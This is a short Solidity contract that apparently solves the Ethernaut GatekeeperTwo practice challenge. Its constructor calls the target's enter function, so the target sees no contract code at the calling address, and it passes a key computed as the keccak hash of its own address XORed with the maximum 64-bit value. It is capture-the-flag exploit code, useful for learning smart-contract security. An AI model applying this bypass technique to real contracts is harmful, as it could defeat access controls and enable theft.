import "./GatekeeperTwo.sol";

pragma solidity ^0.8.0;

contract Attack_GatekeeperTwo {

    constructor() {
        GatekeeperTwo target = GatekeeperTwo(0x3d0f2b68Da22f8ac730Bb9a60d1af4ae932f814B);
        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        target.enter(key);
    }

}